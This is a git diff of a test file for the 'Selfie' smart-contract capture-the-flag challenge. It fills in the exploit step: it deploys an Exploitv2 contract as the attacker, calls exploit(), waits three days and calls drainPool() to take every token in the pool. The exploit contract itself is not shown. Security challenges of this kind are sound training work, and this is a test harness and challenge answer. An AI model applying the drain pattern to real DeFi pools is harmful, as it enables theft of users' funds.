@@ -4,6 +4,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
 const SelfiePool = contract.fromArtifact('SelfiePool');
 const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
+const Exploitv2 = contract.fromArtifact('Exploitv2')
 
 const { expect } = require('chai');
 
@@ -13,7 +14,7 @@ describe('[Challenge] Selfie', function () {
 
     const TOKEN_INITIAL_SUPPLY = ether('2000000')
     const TOKENS_IN_POOL = ether('1500000');
-    
+
 
     before(async function () {
         /** SETUP SCENARIO */
@@ -21,7 +22,7 @@ describe('[Challenge] Selfie', function () {
         this.governance = await SimpleGovernance.new(this.token.address, { from: deployer });
         this.pool = await SelfiePool.new(
             this.token.address,
-            this.governance.address, 
+            this.governance.address,
             { from: deployer }
         );
 
@@ -34,13 +35,24 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        // console.log("args", this.token.address, this.governance.address, this.pool.address)
+        this.exploit = await Exploitv2.new(
+            this.token.address,
+            this.governance.address,
+            this.pool.address,
+            { from: attacker }
+        );
+        // this.exploit = await Exploitv2.new(this.token.address, this.governance.address, this.pool.address, { from: deployer })
+        await this.exploit.exploit()
+        await time.increase(time.duration.days(3))
+        await this.exploit.drainPool()
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         expect(
             await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.bignumber.equal('0');
